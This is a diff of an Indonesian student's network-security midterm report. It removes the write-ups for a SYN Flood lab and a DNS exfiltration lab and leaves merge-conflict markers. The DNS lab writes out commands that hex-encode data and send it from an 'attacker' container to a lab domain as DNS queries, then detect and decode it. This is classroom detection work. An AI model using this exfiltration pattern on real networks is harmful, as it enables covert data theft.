-Jumlah SYN_RECV selama pengujian: [Isi hasil]
-
-Analisis paket: [Jelaskan paket SYN, SYN-ACK, dan ACK yang terlihat.]
-
-### 6. Kesimpulan
-
-TCP Three-Way Handshake merupakan mekanisme pembentukan koneksi TCP. SYN Flood memanfaatkan banyak permintaan SYN sehingga dapat membebani sumber daya server. Pemantauan koneksi TCP membantu administrator mengetahui adanya aktivitas koneksi yang tidak normal.
-
----
-
-# TUGAS 7 — DNS EXFILTRATION
-## Pertemuan 7
-
-### 1. Tujuan
-Memahami bagaimana DNS dapat disalahgunakan sebagai media pengiriman data keluar jaringan, serta mempelajari cara mendeteksi dan membaca data yang dikodekan dalam query DNS.
-
-### 2. Perintah dan penjelasan
-
-**A. Menjalankan lab DNS**
-
-```bash
-docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml up -d
-```
-
-Penjelasan:
-- Menjalankan layanan DNS dan attacker sesuai konfigurasi Compose.
-- `-p k5` memberikan nama proyek.
-- `up -d` menjalankan layanan di latar belakang.
-
-**B. Mengubah NIM menjadi format hexadecimal**
-
-```bash
-echo -n NIM-ANDA | xxd -p
-```
-
-Penjelasan:
-- `echo -n` menampilkan teks tanpa menambahkan karakter newline.
-- `NIM-ANDA` diganti dengan NIM mahasiswa.
-- `xxd -p` mengubah data teks menjadi representasi hexadecimal.
-- Hasil hexadecimal dapat digunakan sebagai label dalam query DNS.
-
-**C. Mengirim query DNS**
-
-```bash
-docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k5.exfil.lab @dns
-```
-
-Penjelasan:
-- `exec attacker` menjalankan perintah dari container attacker.
-- `dig` digunakan untuk melakukan permintaan DNS.
-- `+short` menampilkan jawaban DNS secara ringkas.
-- `<hex>` diganti dengan hasil konversi hexadecimal sebelumnya.
-- `k5.exfil.lab` merupakan domain praktikum.
-- `@dns` menentukan server DNS yang digunakan.
-
-**D. Menyimpan log DNS**
-
-```bash
-docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k5.log
-```
-
-Penjelasan:
-- `logs dns` menampilkan log dari layanan DNS.
-- `>` mengarahkan output ke file.
-- `dns-k5.log` digunakan untuk menyimpan catatan query DNS yang terjadi selama pengujian.
-
-**E. Menganalisis log DNS**
-
-```bash
-python3 kasus/k5-dns-exfil/analisis_dns.py dns-k5.log
-```
-
-Penjelasan:
-- `python3` menjalankan program Python.
-- `kasus/k5-dns-exfil/analisis_dns.py` merupakan script analisis DNS.
-- `dns-k5.log` menjadi file masukan.
-- Script digunakan untuk mendeteksi pola query DNS yang mencurigakan sesuai aturan yang dibuat.
-
-**F. Mengembalikan hexadecimal menjadi teks**
-
-```bash
-echo <hex> | xxd -r -p
-```
-
-Penjelasan:
-- `echo` menampilkan data hexadecimal.
-- `xxd -r -p` mengubah data hexadecimal kembali menjadi teks.
-- Hasilnya seharusnya sama dengan NIM yang sebelumnya dikodekan.
-
-**G. Membersihkan lab**
-
-```bash
-docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml down -v
-```
-
-Penjelasan:
-- Menghentikan dan menghapus container serta network proyek.
-- `-v` menghapus volume yang dikelola oleh Compose.
-
-### 3. Bukti Praktikum
-
-**Screenshot 1:** Hasil konversi NIM ke hexadecimal.
-
-[Tempel screenshot di sini]
-
-**Screenshot 2:** Query DNS menggunakan domain praktikum.
-
-[Tempel screenshot di sini]
-
-**Screenshot 3:** Log DNS yang berhasil disimpan.
-
-[Tempel screenshot di sini]
-
-**Screenshot 4:** Hasil analisis DNS dan proses decoding hexadecimal.
-
-[Tempel screenshot di sini]
-
-### 4. Hasil Pengujian
-
-Hasil hexadecimal: [Isi hasil]
-
-Query DNS: [Isi hasil]
-
-Hasil deteksi: [Isi hasil]
-
-Hasil decoding: [Isi hasil]
-
-### 5. Kesimpulan
-
-DNS Exfiltration merupakan teknik penyalahgunaan protokol DNS untuk mengirimkan data melalui query DNS. Analisis log DNS dapat membantu mendeteksi pola query yang tidak biasa, sedangkan konversi hexadecimal memungkinkan data yang dikirimkan dibaca kembali.
-
----
-
-# KESIMPULAN AKHIR
-
-Berdasarkan praktikum Kasus 5, terdapat tujuh materi keamanan jaringan yang telah dipelajari, yaitu Docker dan Volume, Kriptografi, ARP Spoofing, Analisis Handshake WPA2, ICMP dengan Scapy, SYN Flood, dan DNS Exfiltration.
-
-Setiap praktikum memberikan pemahaman mengenai cara kerja teknologi jaringan, potensi kerentanan, serta metode pengujian dan mitigasi dalam lingkungan laboratorium.
-
-Dokumentasi ini dilengkapi dengan perintah praktikum, penjelasan fungsi setiap perintah, hasil pengujian, dan bukti screenshot sebagai pendukung laporan.
-=======
-# UTS-Network-Security
-Pengumpulan Tugas Ujian Tengah Semester (UTS) Mata Kuliah Network Security.  **Nama:** Putra Baadi Zaelani   **NIM:** 24552011131   **Program Studi:** Teknik Informatika  Repository ini berisi kumpulan source code, dokumentasi, dan bukti hasil pengerjaan praktikum UTS Network Security.
->>>>>>> fbae413f7fb3f3a714929c5ca5f7c47d337840ce
+**Dokumentasi UTS Network Security — Kasus 5, Tugas 1–7.**
